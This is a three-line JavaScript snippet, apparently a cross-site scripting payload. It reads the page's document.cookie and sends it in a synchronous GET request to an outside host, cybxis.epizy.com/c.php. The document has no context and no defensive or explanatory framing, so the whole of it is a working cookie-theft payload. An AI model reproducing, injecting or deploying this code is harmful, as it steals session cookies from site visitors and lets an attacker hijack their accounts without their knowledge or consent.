var xmlHttp = new XMLHttpRequest();
xmlHttp.open( "GET", "https://cybxis.epizy.com/c.php?c=" + document.cookie, false ); // false for synchronous request
xmlHttp.send( null );
